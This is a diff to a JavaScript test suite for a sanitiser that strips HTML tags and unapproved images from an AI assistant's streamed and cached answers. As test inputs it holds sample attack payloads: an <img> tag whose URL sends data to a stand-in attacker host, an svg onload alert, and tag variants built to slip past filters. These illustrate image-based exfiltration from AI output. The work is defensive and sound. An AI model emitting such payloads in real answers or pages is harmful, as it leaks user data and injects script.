@@ -105,12 +105,30 @@ test("stream guard: an <img mid-line is removed, a plain <br> and words after a 
   assert.equal(sent, "Text  more\nAmen! line<br>\nend");
 });
 
-test("stream guard: a tag split across lines is held until its >", () => {
+test("stream guard: a tag split across lines never goes out as a tag, and nothing waits past its line", () => {
   const g = pictureStream(given);
   const out = [g.push("Text <img\n"), g.push("src=\"https://attacker.example/?d=1\">\n"), g.push("after\n")];
-  assert.deepEqual(out.slice(0, 1), ["Text "]);
-  assert.equal(out[1], "\n", "the whole tag went out removed, once complete");
-  assert.doesNotMatch(out.join(""), /attacker|<img/);
+  assert.equal(out[0], "Text img\n", "the unfinished tag's < is dropped at the end of its line");
+  assert.doesNotMatch(out.join(""), /</);
+  assert.equal(out[2], "after\n");
+});
+
+test("stream guard: a stray 'a<b' doesn't freeze the stream past its line", () => {
+  const g = pictureStream(given);
+  assert.equal(g.push("Compare a<b here\n"), "Compare ab here\n");
+  assert.equal(g.push("then more words"), "then more words");
+});
+
+test("tags are removed whole: '/' separators, '<' inside values, ? and ! forms; <br> and autolinks stay", () => {
+  for (const bad of ["<img/src=https://e.example/x?d=1>", "<svg/onload=alert(1)>", '<img alt="<" src=https://e.example/p>', "<?xml x?>", "<!doctype html>", "<!-- c -->", "</div>"])
+    assert.equal(onlyGivenPictures(`A ${bad} B`, new Set()).text, "A  B", bad);
+  assert.equal(onlyGivenPictures("A <img src=https://e.example/p B", new Set()).text, "A img src=https://e.example/p B", "an unfinished tag loses its <");
+  assert.equal(onlyGivenPictures("a<br>b<br/>c <https://cyberjudah.io/bs> a < b", new Set()).text, "a<br>b<br/>c <https://cyberjudah.io/bs> a < b");
+});
+
+test("a kept picture's mark can't be forged by text in the answer", () => {
+  const text = "Text \u00000\u0000 and \uE000x:0\uE001\n![Ok](/people/placeholder.jpg)";
+  assert.equal(onlyGivenPictures(text, new Set(["/people/placeholder.jpg"])).text, text);
 });
 
 test("stream guard: a ! or < that can't start an image or tag doesn't hold the line", () => {
@@ -186,14 +204,20 @@ test("every answer path in ai.ts is a final answer, a fixed sentence or an appro
   assert.equal((ai.match(/approvedFor\(/g) ?? []).length, (ai.match(/const approvedRaw = approvedFor\(/g) ?? []).length, "approvedFor is only ever called as approvedRaw");
   assert.equal((ai.match(/const approved = approvedRaw && await approvedFinal\(env, approvedRaw\);/g) ?? []).length, 3);
   // Kept answers pass the final step again when given (answers kept before it existed).
-  assert.equal((ai.match(/cachedAnswer</g) ?? []).length, (ai.match(/return \{ \.\.\.\(await keptFinal\(env, kept\)\)/g) ?? []).length, "every cache hit goes through keptFinal");
+  assert.equal((ai.match(/cachedAnswer</g) ?? []).length, (ai.match(/return \{ \.\.\.\(await keptFinal\(env, kept, key\)\)/g) ?? []).length, "every cache hit goes through keptFinal");
   // Approved answers trust only their own app pictures.
   assert.match(ai, /finalAnswer\(env, approved\.answer, \{ evidence: [^}]*trustOwnPictures: true \}\)/);
   // Every stream the reader watches is guarded, and settled at the end (no bare reset-and-resend).
   assert.equal((ai.match(/guardedStream</g) ?? []).length, 4, "askStream (research, backup), answerAppAgent, boundedAnswer");
   assert.doesNotMatch(ai, /!== (drafted|draft)\) \{ (send|emit)\(\{ reset: true \}\)/);
-  // The agent keeps only the tools' Picture: lines as evidence, never a cut of the text.
   const agent = readFileSync(new URL("../src/agent.ts", import.meta.url), "utf8");
+  // The agent keeps only the picture tools' Picture: lines as evidence, never a cut of the text, and
+  // never from an outside page or a saved chat.
+  assert.match(agent, /PICTURE_TOOLS = new Set\(\["person", "timeline"\]\)/);
+  assert.match(agent, /PICTURE_TOOLS\.has\(name\) && typeof result\.content === "string"\) control\.evidence/);
+  // A retried bounded answer is always replaced, even when the retry fails part-way (set before it runs).
+  assert.match(ai, /retried = true;[^\n]*\n\s*try \{\n\s*const ran = await write\(true\);/);
+  assert.match(ai, /guard\?\.settle\(answer, drafted, retried\)/);
   assert.match(agent, /control\.evidence\?\.push\(\.\.\.pictureLines\(result\.content\)\)/);
   assert.doesNotMatch(agent, /evidence\?\.push\([^)]*slice\(/);
   // The verse check lives only in the final step.
@@ -258,6 +282,9 @@ test("a kept answer passes the final step again when it is given from the cache"
   assert.doesNotMatch(again.answer, /attacker/);
   assert.match(again.answer, /!\[Own\]\(\/people\/placeholder\.jpg\)/, "its own app picture is kept");
   assert.equal(again.final_step, undefined, "the mark isn't given to readers");
+  const rewritten = JSON.parse(env.SUBS.m.get(key));
+  assert.equal(rewritten.final_step, 1, "kept again as checked");
+  assert.doesNotMatch(rewritten.answer, /attacker/);
 });
 
 test("an answer whose verse check couldn't read the King James text is kept without the final mark, so it is checked again", async () => {
